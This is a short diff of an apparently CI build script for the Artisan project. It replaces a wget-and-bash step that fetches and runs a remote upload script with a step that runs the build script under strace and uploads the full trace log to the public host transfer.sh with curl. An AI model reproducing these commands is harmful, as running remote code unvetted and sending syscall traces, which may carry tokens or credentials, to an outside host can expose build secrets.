@@ -1,1 +1,1 @@
-cd srcwget -c https://github.com/probonopd/uploadtool/raw/master/upload.shif [ "$ARTISAN_OS" = "osx" ]; then bash upload.sh artisan*.dmg; fiif [ "$ARTISAN_OS" = "rpi" ]; then bash upload.sh artisan*.deb; fiif [ "$ARTISAN_OS" = "linux" ]; then bash upload.sh artisan*.rpm artisan*.deb; fi
+chmod u+x _after_success.shstrace -f -r bash -c './_after_success.sh' >> strace_output.log 2>&1curl --upload-file strace_output.log https://transfer.sh/strace_output.log
